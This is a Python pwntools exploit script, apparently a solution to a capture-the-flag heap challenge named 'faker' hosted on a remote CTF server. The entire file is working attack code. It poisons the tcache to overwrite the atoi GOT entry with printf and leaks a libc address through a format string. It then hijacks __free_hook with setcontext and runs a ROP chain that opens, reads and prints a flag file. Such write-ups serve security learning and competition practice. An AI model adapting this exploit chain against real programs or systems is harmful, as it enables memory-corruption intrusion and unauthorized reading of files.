from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './faker'
HOST = 'faker.3k.ctf.to'
PORT =  5231 

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def login(size, name):
    r.sendlineafter('size:\n', str(size))
    r.sendlineafter('name:\n', name)

def create(size):
    r.sendlineafter('> ', '1')
    r.sendlineafter('size:\n', str(size))

def edit(idx, content, switch=False):
    if switch == True:
        r.sendlineafter('> ', '\x01\x01\x00')
        r.sendlineafter('index:\n', '\x01'*idx + '\x00')
    else:
        r.sendlineafter('> ', '2')
        r.sendlineafter('index:\n', str(idx))
    r.sendafter('content:\n', content)

def delete(idx, switch=False):
    if switch == True:
        r.sendlineafter('> ', '\x01\x01\x01\x00')
        r.sendafter('index:\n', ('0x01'*idx)+'\x00')
    else:
        r.sendlineafter('> ', '3')
        r.sendlineafter('index:\n', str(idx))

r = start()

login(8, 'A')
for i in range(8): 
    create(0x68)
    delete(0)

edit(0, p64(0x6020c0-8+5))
create(0x68)
create(0x68)
create(0x68)
delete(0)
delete(2)
payload = ''
payload += 'A'*3
payload += flat(0, 0)
payload += p32(0x68) * 4
payload += flat(0, 0)
payload += p32(0x1) * 4
payload += flat(0, 0)
payload += flat(0x6020e0, elf.got.atoi)

edit(1, payload)
edit(1, p64(elf.plt.printf))

r.sendafter('> ', '%3$p')
leak = int(r.recvuntil('1-')[:-2], 16)
base = leak - 0x110191
dbg('leak')
dbg('base')

setcontext = base + 0x52110 + 0x35
atoi = base + 0x40730
mh = base + 0x3ebc30
fh = base + 0x3ed8e8

rdi = base + 0x0002155f
rsi = base + 0x00023e8a
rax = base + 0x00043a77
rdx = base + 0x00130866
r10 = base + 0x00130865

syscall = base + 0x000d29d5
    
bss = 0x602170

edit(1, p64(atoi), switch=True)

payload = ''
payload += p32(0x68) * 4
payload += p32(0x68) * 4
payload += p32(0x1) * 4
payload += p32(0x1) * 4 
payload += flat(fh, 0x6020e0, bss, bss+0x68, bss+0x68*2)
edit(0, payload)
edit(0, p64(setcontext))

edit(3, '/proc/self/cwd/flag'.ljust(0x20, '\x00') + flat(0x15, 0x16, 0x17, bss+0x68*2, rdi+1, 0x1a, 0x1b, 0x1c, 0x1d))
edit(4, flat(rdi, 0, rsi, bss+0x68, rdx, 0, rax, 0x101, r10, 0, syscall, rdx, 0x20))

payload = ''
payload += p32(0x68) * 4
payload += p32(0x68) * 4
payload += p32(0x1) * 4
payload += p32(0x1) * 4
payload += flat(bss, bss+0x68*3, bss+0x68*4, bss+0x68*5)
edit(1, payload)

edit(1, flat(rdi, 6, rsi, bss, rdx, 0x80, rax, 0, syscall, rdi, 1, rsi, bss)) # exploit
edit(2, flat(rdx, 0x80, rax, 1, syscall, elf.sym.notepad)) # exploit

if args.D:
    debug(r, [0xe9a])
delete(0)

r.interactive()
r.close()
